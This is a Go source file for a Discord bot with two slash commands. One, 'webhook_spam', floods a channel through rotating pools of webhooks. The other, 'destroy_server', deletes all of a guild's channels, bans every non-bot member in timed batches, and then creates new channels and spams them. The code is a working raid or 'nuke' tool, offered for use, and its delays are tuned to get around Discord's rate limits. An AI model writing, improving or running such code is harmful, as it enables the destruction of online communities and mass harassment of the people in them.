package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"sync"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
)

var client = &http.Client{
	Timeout: 10 * time.Second,
	Transport: &http.Transport{
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: 100,
		IdleConnTimeout:     90 * time.Second,
	},
}

type Webhook struct {
	ID  string
	URL string
}

// دالة عامة للتعامل مع أخطاء 429 (Rate Limit) حسب استجابة ديسكورد
func handleRateLimit(resp *http.Response) bool {
	if resp.StatusCode == 429 {
		retryAfterStr := resp.Header.Get("Retry-After")
		if retryAfterStr != "" {
			if seconds, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
				time.Sleep(time.Duration(seconds * float64(time.Second)))
				return true
			}
		}
		time.Sleep(1 * time.Second)
		return true
	}
	return false
}

func main() {
	token := os.Getenv("MASTERGUARD_TOKEN")
	if token == "" {
		log.Fatal("Error: MASTERGUARD_TOKEN environment variable is not set.")
	}

	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		log.Fatalf("Error creating Discord session: %v", err)
	}

	dg.Identify.Intents = discordgo.IntentsGuilds | 
		discordgo.IntentsGuildMessages | 
		discordgo.IntentsGuildMembers | 
		discordgo.IntentsGuildBans

	dg.AddHandler(func(s *discordgo.Session, i *discordgo.InteractionCreate) {
		if i.Type != discordgo.InteractionApplicationCommand {
			return
		}

		switch i.ApplicationCommandData().Name {
		case "webhook_spam":
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Starting webhook pool loop...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			go runWebhookLoop(token, i.ChannelID, "spam-wh", "Spam Message", 50, 10, 3*time.Second)

		case "destroy_server":
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Executing precise interval workflow...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			go runPreciseWorkflow(s, i.GuildID, "Message from bot")
		}
	})

	err = dg.Open()
	if err != nil {
		log.Fatalf("Error opening connection: %v", err)
	}
	defer dg.Close()

	commands := []*discordgo.ApplicationCommand{
		{
			Name:        "webhook_spam",
			Description: "Run webhook pool spam loop",
		},
		{
			Name:        "destroy_server",
			Description: "Run precise timing server workflow",
		},
	}

	_, err = dg.ApplicationCommandBulkOverwrite(dg.State.User.ID, "", commands)
	if err != nil {
		log.Fatalf("Cannot register commands: %v", err)
	}

	log.Println("Bot is running. Press CTRL-C to exit.")
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-sc
	log.Println("Shutting down.")
}

// 1. لوب الويب هوكات (10 -> إرسال -> 3 ثواني -> حذف)
func runWebhookLoop(token, channelID, baseName, messageContent string, totalMessages int, webhookPoolSize int, pauseDuration time.Duration) {
	headers := map[string]string{
		"Authorization": "Bot " + token,
		"Content-Type":  "application/json",
	}

	sentCount := 0

	for sentCount < totalMessages {
		var pool []Webhook
		var mu sync.Mutex
		var wg sync.WaitGroup

		for i := 0; i < webhookPoolSize; i++ {
			wg.Add(1)
			go func(idx int) {
				defer wg.Done()
				body, _ := json.Marshal(map[string]string{
					"name": fmt.Sprintf("%s-%d", baseName, idx+1),
				})

				req, err := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+channelID+"/webhooks", bytes.NewBuffer(body))
				if err != nil {
					return
				}
				for k, v := range headers {
					req.Header.Set(k, v)
				}

				resp, err := client.Do(req)
				if err != nil {
					return
				}
				defer resp.Body.Close()

				if handleRateLimit(resp) {
					return
				}

				if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
					var res map[string]interface{}
					if json.NewDecoder(resp.Body).Decode(&res) == nil {
						if id, ok1 := res["id"].(string); ok1 {
							if tk, ok2 := res["token"].(string); ok2 {
								mu.Lock()
								pool = append(pool, Webhook{
									ID:  id,
									URL: fmt.Sprintf("https://discord.com/api/v10/webhooks/%s/%s", id, tk),
								})
								mu.Unlock()
							}
						}
					}
				}
			}(i)
		}
		wg.Wait()

		if len(pool) == 0 {
			time.Sleep(500 * time.Millisecond)
			continue
		}

		for _, wh := range pool {
			if sentCount >= totalMessages {
				break
			}
			b, _ := json.Marshal(map[string]string{"content": messageContent})
			req, err := http.NewRequest("POST", wh.URL, bytes.NewBuffer(b))
			if err == nil {
				req.Header.Set("Content-Type", "application/json")
				if resp, err := client.Do(req); err == nil {
					handleRateLimit(resp)
					resp.Body.Close()
				}
			}
			sentCount++
		}

		time.Sleep(pauseDuration)

		for _, wh := range pool {
			req, err := http.NewRequest("DELETE", "https://discord.com/api/v10/webhooks/"+wh.ID, nil)
			if err == nil {
				for k, v := range headers {
					req.Header.Set(k, v)
				}
				if resp, err := client.Do(req); err == nil {
					handleRateLimit(resp)
					resp.Body.Close()
				}
			}
		}
	}
}

// 2. الأمر الثاني حسب الشروط الزمنية والدفعات بدقة
func runPreciseWorkflow(s *discordgo.Session, guildID string, messageContent string) {
	// أ. حذف الرومات: روم كل 30 ملي ثانية
	channels, err := s.GuildChannels(guildID)
	if err == nil {
		for _, ch := range channels {
			_, err := s.ChannelDelete(ch.ID)
			if err != nil {
				time.Sleep(1 * time.Second)
			}
			time.Sleep(30 * time.Millisecond)
		}
	}

	// ب. تقسيم الباند إلى 50 شخص لكل دفعة، وكل شخص يقعد 100 ملي ثانية
	members, err := s.GuildMembers(guildID, "", 1000)
	if err == nil && len(members) > 0 {
		var batch []string
		for _, m := range members {
			if m.User.Bot {
				continue
			}
			batch = append(batch, m.User.ID)
			if len(batch) == 50 {
				processBansBatch(s, guildID, batch)
				batch = nil
			}
		}
		if len(batch) > 0 {
			processBansBatch(s, guildID, batch)
		}
	}

	// ج. إنشاء الرومات ورسايل البوت:
	for i := 0; i < 20; i++ {
		newChannel, err := s.GuildChannelCreateComplex(guildID, discordgo.GuildChannelCreateData{
			Name: fmt.Sprintf("room-%d", i+1),
			Type: discordgo.ChannelTypeGuildText,
		})
		
		if err == nil && newChannel != nil {
			go func(chID string) {
				for m := 0; m < 5; m++ {
					s.ChannelMessageSend(chID, messageContent)
					time.Sleep(20 * time.Millisecond)
				}
			}(newChannel.ID)
		}
		
		time.Sleep(30 * time.Millisecond)
	}
}

func processBansBatch(s *discordgo.Session, guildID string, userIDs []string) {
	for _, userID := range userIDs {
		err := s.GuildBanCreate(guildID, userID, 1)
		if err != nil {
			time.Sleep(1 * time.Second)
		}
		time.Sleep(100 * time.Millisecond)
	}
}
